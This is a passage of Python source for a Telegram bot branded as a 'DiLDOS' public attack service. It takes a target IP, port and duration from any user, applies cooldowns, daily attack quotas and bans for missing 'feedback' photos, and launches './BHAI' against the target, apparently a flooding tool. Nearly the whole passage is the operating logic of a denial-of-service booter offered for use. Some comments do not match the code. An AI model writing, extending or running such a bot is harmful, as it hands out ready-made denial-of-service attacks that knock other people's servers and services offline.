                    f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 10} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 10} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️ "
                )
                return

        # Check attack count
        if user_id not in user_attacks:
            user_attacks[user_id] = 0

        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️"
            )
            return

        # Check if the user has provided feedback after the last attack
        if user_id in user_attacks and user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
            user_bans[user_id] = datetime.now() + BAN_DURATION  # Ban user for 2 hours
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, ⚠️⚠️𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 10 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
            )
            return

# Fetch user profile picture
    try:
        photos = bot.get_user_profile_photos(user_id)
        has_photo = photos.total_count > 0
        if has_photo:
            photo_file_id = photos.photos[0][0].file_id  # Get latest profile picture
        else:
            photo_file_id = None
    except Exception as e:
        print(f"❌ Error fetching profile photos: {e}")
        has_photo = False
        photo_file_id = None

    # Ensure only one attack is running
    if active_attack:
        remaining_time = max(0, int((attack_end_time - datetime.now()).total_seconds()))
        bot.send_message(
            message.chat.id,
            f"⚠️ An attack is already running!\n"
            f"⏳ Time left: {remaining_time} seconds.\n\n"
            f"USE `/CHECK` TO SEE ATTACK DETAILS."
        )
        return

    # Split the command to get parameters
    try:
        args = message.text.split()[1:]  # Skip the command itself
        logging.info(f"Received arguments: {args}")

        if len(args) != 3:
            raise ValueError("𝙏𝙁_𝙁𝙇𝘼𝙎𝙃 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪??𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩 \n /bgmi <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")

        target_ip, target_port, user_duration = args

        # Validate inputs
        if not is_valid_ip(target_ip):
            raise ValueError("Invalid IP address.")
        if not is_valid_port(target_port):
            raise ValueError("Invalid port number.")
        if not is_valid_duration(user_duration):
            raise ValueError("Invalid duration. Must be a positive integer.")

        # Increment attack count for non-exempted users
        if user_id not in AUTHORIZED_USERS:
            user_attacks[user_id] += 1
            user_photos[user_id] = False  # Reset photo feedback requirement

        # Set cooldown for non-exempted users
        if user_id not in AUTHORIZED_USERS:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        # Notify that the attack will run for the default duration of 150 seconds, but display the input duration
        default_duration = 125
        
        remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
                
        duration = int(user_duration)
        active_attack = (target_ip, target_port, duration)
        attack_end_time = datetime.now() + timedelta(seconds=duration)
        user_info = message.from_user
        username = user_info.username if user_info.username else user_info.first_name
        bot.send_message(
        message.chat.id,
            f"🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 \n{target_ip} : {target_port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ] \n\nUse /check to see attack status\n\n🖤𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔🖤 :- {remaining_attacks}\n\n★[𝔸𝕋𝕋𝔸ℂ𝕂𝔼ℝ 𝙉𝘼𝙈𝙀]★:- @{username}\n\n❗️❗️ 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
        )

        # Run the attack command with the default duration and pass the user-provided duration for the finish message
        asyncio.run(run_attack_command_async(target_ip, int(target_port), default_duration, user_duration, user_name, message.chat.id))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))

async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name, chat_id):
    global active_attack
    try:
        # Run the shell command asynchronously
        process = await asyncio.create_subprocess_shell(
            f"./BHAI {target_ip} {target_port} {duration} 1210",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        # Wait for the process to complete and capture output
        stdout, stderr = await process.communicate()

        # Log stdout and stderr if available
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

        # ✅ Notify the user that the attack has finished
        bot.send_message(
            chat_id,  # ✅ Using chat_id correctly
            f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {target_ip}:{target_port} 𝙛𝙤𝙧 {duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅\n\n‼️𝙏𝙁_𝙁𝙇𝘼𝙎𝙃 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™‼️"
        )

    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {str(e)}", parse_mode="Markdown")

    finally:
        active_attack = None  # ✅ Reset attack statu

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")